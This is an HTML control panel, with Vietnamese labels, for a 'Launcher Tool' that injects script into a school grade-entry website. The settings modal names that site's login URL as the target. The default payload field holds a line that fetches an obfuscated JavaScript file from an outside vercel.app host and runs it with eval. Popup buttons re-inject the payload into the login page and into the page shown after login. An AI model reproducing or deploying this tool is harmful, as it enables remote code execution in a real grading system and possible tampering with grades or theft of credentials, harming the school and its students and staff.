<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Launcher Tool</title>
<!-- Sửa lại đường dẫn tuyệt đối cho CSS -->
<link rel="stylesheet" href="./style.css">
</head>
<body>
<div class="container">
  <h1>LAUNCHER PANEL</h1>

  <div class="panel">
    <button id="btnLaunch" class="btn primary">LAUNCH TOOL</button>
    <button id="btnSettingTool" class="btn">SETTING TOOL</button>
    <button id="btnSettingWeb" class="btn">SETTING WEB</button>
  </div>

  <div id="status" class="status">Trạng thái: Chờ lệnh</div>
</div>

<!-- Tìm đến đoạn Popup trong index.html và sửa lại thành: -->
<div id="popup" class="popup hidden">
  <div class="popup-content">
    <h2>Tool bị ngắt / Cần Inject</h2>
    <p>Phát hiện tool đã dừng hoặc cần chuyển trang. Inject lại?</p>
    <div class="popup-actions" style="flex-direction: column;">
      <button id="btnReinject" class="btn primary">INJECT LẠI TRANG LOGIN</button>
      <button id="btnInjectNext" class="btn primary" style="background:#1f6feb; border-color:#388bfd;">INJECT TRANG SAU (ĐÃ ĐĂNG NHẬP)</button>
      <button id="btnClose" class="btn">ĐÓNG</button>
    </div>
  </div>
</div>

<!-- Setting Tool -->
<div id="settingTool" class="modal hidden">
  <div class="modal-content">
    <h2>SETTING TOOL</h2>
    <label>URL đích:</label>
    <input type="text" id="inpTargetUrl" value="https://nhapdiem.truonghocviet.vn/Account/Login">
    <label>Payload inject:</label>
    <textarea id="inpPayload">fetch('https://vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);</textarea>
    <label>Thời gian chờ (ms):</label>
    <input type="number" id="inpDelay" value="3000">
    <div class="modal-actions">
      <button id="btnSaveTool" class="btn primary">LƯU</button>
      <button id="btnCloseTool" class="btn">ĐÓNG</button>
    </div>
  </div>
</div>

<!-- Setting Web -->
<div id="settingWeb" class="modal hidden">
  <div class="modal-content">
    <h2>SETTING WEB</h2>
    <label>Tiêu đề:</label>
    <input type="text" id="inpTitle" value="Launcher Tool">
    <label>Màu nền:</label>
    <input type="color" id="inpBg" value="#0d1117">
    <label>Màu chữ:</label>
    <input type="color" id="inpText" value="#c9d1d9">
    <div class="modal-actions">
      <button id="btnSaveWeb" class="btn primary">LƯU</button>
      <button id="btnCloseWeb" class="btn">ĐÓNG</button>
    </div>
  </div>
</div>

<!-- Sửa lại đường dẫn tuyệt đối cho JS -->
<script src="./script.js"></script>
</body>
</html>
